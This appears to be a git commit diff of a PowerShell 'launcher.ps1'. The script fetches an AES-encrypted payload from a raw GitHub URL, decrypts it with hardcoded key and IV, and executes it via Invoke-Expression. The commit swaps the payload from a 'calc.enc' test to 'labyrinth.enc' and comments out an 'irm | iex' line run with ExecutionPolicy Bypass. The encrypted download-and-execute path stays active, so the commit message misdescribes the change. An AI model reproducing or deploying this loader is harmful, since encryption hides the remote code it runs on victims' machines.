e535870a0f657c6a54e6bbc0766e54c3ee876a6a
Giovanni Piccolo <piccolog93@gmail.com>
2025-11-06 14:16:35 +0100

    Comment out sensitive variables and command execution

--- launcher.ps1
+++ launcher.ps1
@@ -1,9 +1,9 @@
-$key_b64   = "JxkIC5hdeFn22yHVp+BXlkhKnfqkNyh733dhlHGfk4g="
-$iv_b64    = "40s4YD1TaV08ZTOdrn1eoA=="
-$url       = "https://raw.githubusercontent.com/johnsmol/labyrinth/refs/heads/master/calc.enc"
-#$key_b64   = "P+zcMUiVdfCg+qm2jpBfg4BSNHNX16FKgbUncJIQc2U="
-#$iv_b64    = "lQekH4XYZ4W5yE+gZg4inw=="
-#$url       = "https://raw.githubusercontent.com/johnsmol/labyrinth/refs/heads/master/labyrinth.enc"
+#$key_b64   = "JxkIC5hdeFn22yHVp+BXlkhKnfqkNyh733dhlHGfk4g="
+#$iv_b64    = "40s4YD1TaV08ZTOdrn1eoA=="
+#$url       = "https://raw.githubusercontent.com/johnsmol/labyrinth/refs/heads/master/calc.enc"
+$key_b64   = "P+zcMUiVdfCg+qm2jpBfg4BSNHNX16FKgbUncJIQc2U="
+$iv_b64    = "lQekH4XYZ4W5yE+gZg4inw=="
+$url       = "https://raw.githubusercontent.com/johnsmol/labyrinth/refs/heads/master/labyrinth.enc"
 $data_b64  = (New-Object Net.WebClient).DownloadString($url)
 $keyBytes = [System.Convert]::FromBase64String($key_b64)
 $ivBytes  = [System.Convert]::FromBase64String($iv_b64)
@@ -16,5 +16,5 @@ $decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedB
 $decryptedCommand = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
 $aes.Dispose()
 $decryptor.Dispose()
-Start-Process -FilePath "powershell.exe" -ArgumentList '-NoExit -ExecutionPolicy Bypass -Command irm "https://raw.githubusercontent.com/johnsmol/labyrinth/refs/heads/master/labyrinth.ps1" | iex' -WindowStyle Normal
+#Start-Process -FilePath "powershell.exe" -ArgumentList '-NoExit -ExecutionPolicy Bypass -Command irm "https://raw.githubusercontent.com/johnsmol/labyrinth/refs/heads/master/labyrinth.ps1" | iex' -WindowStyle Normal
 Invoke-Expression $decryptedCommand
